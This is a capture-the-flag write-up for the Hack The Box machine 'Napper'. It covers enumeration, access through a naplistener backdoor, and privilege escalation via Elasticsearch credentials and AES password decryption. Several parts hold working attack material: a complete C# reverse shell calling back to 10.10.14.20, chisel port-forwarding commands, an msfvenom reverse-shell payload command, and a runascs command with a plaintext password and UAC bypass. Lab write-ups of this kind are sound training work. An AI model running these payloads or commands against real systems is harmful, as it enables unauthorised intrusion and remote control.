# HTB - Napper

### TL;DR
This is a Windows 10 pro workstation used by a group of malware researchers. For their investigations, they run a blog to post their findings and an internal elasticsearch server. They are currently researching the naplistener malware and it seems that, unfortunately, the software has infected the machine leaving it exposed to external attacks, this can be leveraged for user foothold. For privesc, the internal elasticsearch server needs to be attacked along with reversing in a local golang executable binary.

**Keywords:**<br>
naplistener, c#, elasticsearch, reversing, golang, AES

**References:**<br>
https://www.sslchecker.com/certdecoder<br>
https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph<br>
https://thehackernews.com/2023/03/new-naplistener-malware-used-by-ref2924.html<br>
https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension<br>
https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865<br>
<br>

### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-12 04:32 EST
Nmap scan report for 10.129.160.140
Host is up, received user-set (0.098s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE   REASON
80/tcp   open  http      syn-ack
443/tcp  open  https     syn-ack
7680/tcp open  pando-pub syn-ack

Nmap done: 1 IP address (1 host up) scanned in 118.89 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p80,443,7680 -sV -sC -Pn -vv
Nmap scan report for 10.129.160.140
Host is up, received user-set (0.093s latency).
Scanned at 2023-11-12 04:36:28 EST for 53s

PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://app.napper.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp  open  ssl/http   syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_ssl-date: 2023-11-12T09:37:27+00:00; +7s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US/organizationalUnitName=MlopsHub Dev/localityName=San Fransisco
| Subject Alternative Name: DNS:app.napper.htb
| Issuer: commonName=ca.napper.htb/countryName=US/localityName=San Fransisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-07T14:58:55
| Not valid after:  2033-06-04T14:58:55
| MD5:   ee1adff89a6f5ddd1add9d22040858dc
| SHA-1: f134fe3831f50c749a26d44163a8232da67a782b
| -----BEGIN CERTIFICATE-----
| MIIDzTCCArWgAwIBAgIJALM7fwOVfMaCMA0GCSqGSIb3DQEBCwUAMD0xFjAUBgNV
| BAMMDWNhLm5hcHBlci5odGIxCzAJBgNVBAYTAlVTMRYwFAYDVQQHDA1TYW4gRnJh
| bnNpc2NvMB4XDTIzMDYwNzE0NTg1NVoXDTMzMDYwNDE0NTg1NVowfTELMAkGA1UE
| BhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcMDVNhbiBGcmFuc2lz
| Y28xETAPBgNVBAoMCE1Mb3BzSHViMRUwEwYDVQQLDAxNbG9wc0h1YiBEZXYxFzAV
| BgNVBAMMDmFwcC5uYXBwZXIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
| CgKCAQEAqkM19E9lbE476qF6RBriuwNHdCgjwLybb9pXWIgtPen6hNCBvzp0XLlY
| ZWJ3NNszYH7Z6pgDJHCDIrSZXtkAEHh7AdoN7ZFLWScHwz/qWesBjH2DYHfBABkm
| qorv3dS6MqpZXJK81e1bQdS9IlRiPmJTYHX17+vfd7FBP2XaARtpgDIkDEPyPIIe
| GfTbtk3/E3N/EjZX7lR7lgAMhZmpEpmb7AoQ1btPraFwH/PXG5r020vfC+fCzgAK
| X3BmCfSzUI2AXz/2GJrRsSSdjKTCLJgn5Cau9bI+IO9pH3HOkfXDiWLB4ip++dGK
| hxYMEc5xwrcF3ZsE6s42cisD8pNipwIDAQABo4GPMIGMMFcGA1UdIwRQME6hQaQ/
| MD0xFjAUBgNVBAMMDWNhLm5hcHBlci5odGIxCzAJBgNVBAYTAlVTMRYwFAYDVQQH
| DA1TYW4gRnJhbnNpc2NvggkA4xs9TVmYevYwCQYDVR0TBAIwADALBgNVHQ8EBAMC
| BPAwGQYDVR0RBBIwEIIOYXBwLm5hcHBlci5odGIwDQYJKoZIhvcNAQELBQADggEB
| ABuy5lV920FJXR4j0dWSAqpEPCXj3jVc7vbozP24sFAocNCzodYiuKV10NyhXxJ+
| rxgu5HgmWk47yaz17eYwMDWYnfoIGRVMl4IkSve/9wr1+ReiywIPGyCG/GCxk3KI
| OG/IyX9j8KR7bhTnlMPixVVqkAu0E2CwZ8I0WmjBdQzEs4wBmpmRO5Eqodxf/jkM
| 3a7CU0Q3m9+SKwOnvarn0Wp++UmlD4/y+O8+j9+URXtD7RElZfrcv9wknVGD7H0s
| U98Kn5WCVanMjGtaQmBjCNdTX/6rif90qiTgyw3mGw8IyatfXAwF75jkvB4vTAHk
| ziVXyfoozsWvOoF8/YiMKsI=
|_-----END CERTIFICATE-----
|_http-generator: Hugo 0.112.3
7680/tcp open  pando-pub? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6s

Nmap done: 1 IP address (1 host up) scanned in 53.05 seconds
```
The certificate can be inspected with https://www.sslchecker.com/certdecoder
```markdown
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            b3:3b:7f:03:95:7c:c6:82
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=ca.napper.htb, C=US, L=San Fransisco
        Validity
            Not Before: Jun  7 14:58:55 2023 GMT
            Not After : Jun  4 14:58:55 2033 GMT
        Subject: C=US, ST=California, L=San Fransisco, O=MLopsHub, OU=MlopsHub Dev, CN=app.napper.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:aa:43:35:f4:4f:65:6c:4e:3b:ea:a1:7a:44:1a:
                    e2:bb:03:47:74:28:23:c0:bc:9b:6f:da:57:58:88:
                    2d:3d:e9:fa:84:d0:81:bf:3a:74:5c:b9:58:65:62:
                    77:34:db:33:60:7e:d9:ea:98:03:24:70:83:22:b4:
                    99:5e:d9:00:10:78:7b:01:da:0d:ed:91:4b:59:27:
                    07:c3:3f:ea:59:eb:01:8c:7d:83:60:77:c1:00:19:
                    26:aa:8a:ef:dd:d4:ba:32:aa:59:5c:92:bc:d5:ed:
                    5b:41:d4:bd:22:54:62:3e:62:53:60:75:f5:ef:eb:
                    df:77:b1:41:3f:65:da:01:1b:69:80:32:24:0c:43:
                    f2:3c:82:1e:19:f4:db:b6:4d:ff:13:73:7f:12:36:
                    57:ee:54:7b:96:00:0c:85:99:a9:12:99:9b:ec:0a:
                    10:d5:bb:4f:ad:a1:70:1f:f3:d7:1b:9a:f4:db:4b:
                    df:0b:e7:c2:ce:00:0a:5f:70:66:09:f4:b3:50:8d:
                    80:5f:3f:f6:18:9a:d1:b1:24:9d:8c:a4:c2:2c:98:
                    27:e4:26:ae:f5:b2:3e:20:ef:69:1f:71:ce:91:f5:
                    c3:89:62:c1:e2:2a:7e:f9:d1:8a:87:16:0c:11:ce:
                    71:c2:b7:05:dd:9b:04:ea:ce:36:72:2b:03:f2:93:
                    62:a7
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Authority Key Identifier: 
                DirName:/CN=ca.napper.htb/C=US/L=San Fransisco
                serial:E3:1B:3D:4D:59:98:7A:F6

            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment
            X509v3 Subject Alternative Name: 
                DNS:app.napper.htb
    Signature Algorithm: sha256WithRSAEncryption
         1b:b2:e6:55:7d:db:41:49:5d:1e:23:d1:d5:92:02:aa:44:3c:
         25:e3:de:35:5c:ee:f6:e8:cc:fd:b8:b0:50:28:70:d0:b3:a1:
         d6:22:b8:a5:75:d0:dc:a1:5f:12:7e:af:18:2e:e4:78:26:5a:
         4e:3b:c9:ac:f5:ed:e6:30:30:35:98:9d:fa:08:19:15:4c:97:
         82:24:4a:f7:bf:f7:0a:f5:f9:17:a2:cb:02:0f:1b:20:86:fc:
         60:b1:93:72:88:38:6f:c8:c9:7f:63:f0:a4:7b:6e:14:e7:94:
         c3:e2:c5:55:6a:90:0b:b4:13:60:b0:67:c2:34:5a:68:c1:75:
         0c:c4:b3:8c:01:9a:99:91:3b:91:2a:a1:dc:5f:fe:39:0c:dd:
         ae:c2:53:44:37:9b:df:92:2b:03:a7:bd:aa:e7:d1:6a:7e:f9:
         49:a5:0f:8f:f2:f8:ef:3e:8f:df:94:45:7b:43:ed:11:25:65:
         fa:dc:bf:dc:24:9d:51:83:ec:7d:2c:53:df:0a:9f:95:82:55:
         a9:cc:8c:6b:5a:42:60:63:08:d7:53:5f:fe:ab:89:ff:74:aa:
         24:e0:cb:0d:e6:1b:0f:08:c9:ab:5f:5c:0c:05:ef:98:e4:bc:
         1e:2f:4c:01:e4:ce:25:57:c9:fa:28:ce:c5:af:3a:81:7c:fd:
         88:8c:2a:c2
```
So there is a subdomain called `app.napper.htb`. We can enumerate further subdomains with `ffuf`
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 5602 -t 100 -u https://napper.htb -H "Host: FUZZ.napper.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://napper.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.napper.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5602
________________________________________________

internal                [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 102ms]
:: Progress: [4989/4989] :: Job [1/1] :: 734 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
We have found another subdomain called `internal.napper.htb`. If we browse it with firefox, a login web page appears.

![napper1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/0e09e565-efa8-45dd-8895-ffe846f21a2f)

Browsing the login site with burpsuite, we see it uses basic authorization, where the credentials are sent in base64. The next step would be to find valid credentials for this site. In the blog `app.napper.htb` there are information about how the basic authorization works.
### PHASE 2: User
Browsing the site we find the procedure they followed to configure the server, including the default password used.

![napper2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8081003f-c577-4f92-aca7-8f8a9166966e)

Trying these credentials (example:ExamplePassword) in the login page, we are given access to the internal area. Inside the restricted area we find out there is an investigation ongoing on a malware called naplistener. Doing a search in Internet, we find out 2 good resources to have an undertanding of this malware.<br>
https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph<br>
https://thehackernews.com/2023/03/new-naplistener-malware-used-by-ref2924.html<br>
In summary, it is a malware written in c# which starts an http listener in the infected machines. Once the listener is running, if you send base64 encoded c# payloads to certain endpoint, it will be executed in memory. It is designed to masquerade and evade network-based detection methods, for this same reason, it will only process requests sent to `/ews/MsExgHealthCheckd/`, in the `sdafwe3rwe23` parameter. Any other tries to interact with naplistener will be responded with a 404 code.
To verify if naplistener is running in the host, we send a base64 "aaa" payload to the endpoint and it is respondeded with OK 200. Therefore, naplistener is running in the system.

![napper3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/1140e4eb-37fb-4e53-a586-589b630da358)

We conclude if we send a base64-encoded c# reverse shell it will be decoded by naplistener and executed.
Next step is to download a c# tcp shell from http://www.revshells.com. Bear in mind it cannot be used off-the-self, it needs some modifications.
1. Namespace must match filename
2. It must contain a `Run` class
3. Create a constructor and place the shell code inside, so it is automatically invoked whenever an instance of the class is created. 
4. The `main()` point of entry will just call the constructor

An example payload could be the following:
```c#
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Present
{
	public class Run
	{
		static StreamWriter streamWriter;

		public Run()
		{
			using(TcpClient client = new TcpClient("10.10.14.20", 9001))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		public static void Main(string[] args)
		{
			new Run();
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
	}
}
```
Compile with `mcs`, remember the filename must match the namespace.
```markdown
> mcs -out:Present.exe Present.cs

present.cs(69,34): warning CS0168: The variable `err' is declared but never used
Compilation succeeded - 1 warning(s)
```
Encode base64 the resulting binary.
```markdown
> base64 -w 0 ./Present.exe
```
Send the payload with burpsuite, don't forget to URL-encode to avoid problematic characters.

![napper4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/1980268c-79fe-44aa-a94e-cba7f1d47d57)

A reverse shell for user ruben is received.
### PHASE 3. System
Enumerate the system info.
```markdown
> systeminfo
Host Name:                 NAPPER
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
System Type:               x64-based PC
```
Enumerating with `winpeas.exe`, a binary is discovered in a folder for which we have write access.
```markdown
> C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe
```
In this folder there is also a `.env` file containing credentials.
```markdown
> C:\Temp\www\internal\content\posts\internal-laps-alpha>type .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here
ELASTICURI=https://127.0.0.1:9200
```
We also find a local service running on port 9200, doing some research, we find out this port is owned by elasticsearch. Place a chisel and forward port 9200 to kali.
```markdown
./chisel64 server -p 8000 --reverse
chisel64.exe client 10.10.14.20:8000 R:9200
```
Browsing the site locally with firefox `https://localhost:9200`, an elasticsearch login website appears.
Next step is to decompile the `a.exe` file with a reversing tool. The file turns out to have been written in golang.
Conclusions after inspecting the source code:
1. If you use ghidra, look for a golang extension to assist in decompile process.
2. The binary reads environamental variables from the `.env` file. 
3. In the source you can find credentials for `elastic` user.
4. The binary updates password for user `backup`, which is written in a json field called `blob`

![napper5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b5dc1e65-ab60-4883-9cae-019afdf52890)

Use the `elastic` user ceredentials to log into the elasticsearch site. Query the https://localhost:9200/_search endpoint to find the `blob` parameter, which contains the encoded current password for user `backup` and the `seed` used to AES encode it.
Once both parameters are retrieved, we can decode the `backup` user password. For this, it is needed to create our own go script, one good starting point can be found here: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865
Also, bear in mind that password for user `backup` is updated periodically. Once the password is obtained, we just need to log in as user `backup`. There are no open ports 135, 445, 3389, 5985, so `impacket`, `rdesktop` and `evil-winrm` are discarded. A good alternative could be `runascs` with a `shell.exe` payload generated with `msfvenom`
```markdown
> msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.20 lport=9000 -f exe -a x64 --platform windows -o shell.exe  
```
Start a listener on port 9000 and use `runascs` to run the `shell.exe` payload as `backup` user.
```markdown
> runascs.exe backup xiwPzcjGQJgwQYFBKNphoChSXzPXcUroEDqqjIBF shell.exe -t 8 --bypass-uac
```
A shell for user `backup` is received, which can be used to dump the `root.txt` flag in administrator desktop.
